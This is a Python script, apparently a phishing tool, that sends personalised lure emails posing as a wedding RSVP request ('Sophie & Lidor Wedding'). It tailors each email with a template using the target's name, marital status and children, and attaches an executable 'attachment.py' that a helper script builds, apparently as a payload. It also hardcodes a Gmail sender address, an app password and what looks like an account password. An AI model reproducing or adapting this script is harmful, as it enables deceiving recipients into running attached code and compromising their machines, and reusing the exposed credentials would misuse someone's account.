import sys
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
from jinja2 import Environment, FileSystemLoader
import subprocess

# run: python3 Phishing.py Username mail_service_name title job_title personal_status kids_no_kids

# run: python3 Phishing.py eventyess2023 gmail.com title job_title single yes
# run: python3 Phishing.py eventyess2023 gmail.com title job_title married yes
# run: python3 Phishing.py eventyess2023 gmail.com ms job_title married no

if __name__ == "__main__":
    username = sys.argv[1]
    mail_server_name = sys.argv[2]
    title = sys.argv[3]
    job_title = sys.argv[4]
    personal_status = sys.argv[5]
    kids_or_no_kids = sys.argv[6]


    # Run another Python script
    subprocess.run(['python', 'attach_create.py'])
    # Create the Jinja2 environment
    env = Environment(loader=FileSystemLoader('templates'))

    # eventyess2023@gmail.com
    #    zxcvbnm,./1029
    #    wakycmkffmdbvwhj

    data = {
        'title': title,
        'name': username,
        'status': personal_status,
        'kids': kids_or_no_kids
    }
    sender_email = "eventyess2023@gmail.com"
    receiver_email = username + "@" + mail_server_name 
    password = "wakycmkffmdbvwhj"

    message = MIMEMultipart("alternative")
    message["Subject"] = "Arrival Confirmation - Sophie & Lidor Wedding"
    message["From"] = sender_email
    message["To"] = receiver_email

    # Render the template
    template = env.get_template('are_you_coming.html')
    output = template.render(data)
    
    part1 = MIMEText(output, "html")

    # Attach the image as an attachment
    with open("wedding2.png", "rb") as image_file:
        image = MIMEImage(image_file.read())
        image.add_header("Content-ID", "<image1>")
        message.attach(image)

    # Attach the file "attachment.py"
    filename = "attachment.py"
    with open(filename, "rb") as file:
        attachment = MIMEBase("application", "octet-stream")
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition",
                              f"attachment; filename={filename}")
        message.attach(attachment)

    message.attach(part1)

    # Create secure connection with server and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
